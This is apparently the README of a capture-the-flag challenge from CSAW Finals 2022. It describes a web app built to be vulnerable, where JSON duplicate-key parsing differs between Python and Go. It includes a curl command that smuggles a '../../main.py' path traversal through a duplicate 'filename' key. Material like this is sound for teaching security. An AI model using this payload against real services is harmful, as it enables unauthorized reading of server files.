# homeworkme
A vulnerable web app involving JSON interoperability and LFI developed for CSAW Finals 2022

Homework files are stored in `/service/files` and are sorted by hard-coded subjects. Files inside the subjects will automatically be detected by the service.

## writeup
- Python last key precedence
- Golang jsonparser first key precendence

```bash
curl -X POST -d '{"filename": "[EXISTING FILE]", "filename": "../../main.py", "subject": "math"}' http:/
/localhost:1234/homework
```
## references
- https://github.com/BishopFox/json-interop-vuln-labs
- https://bishopfox.com/blog/json-interoperability-vulnerabilities
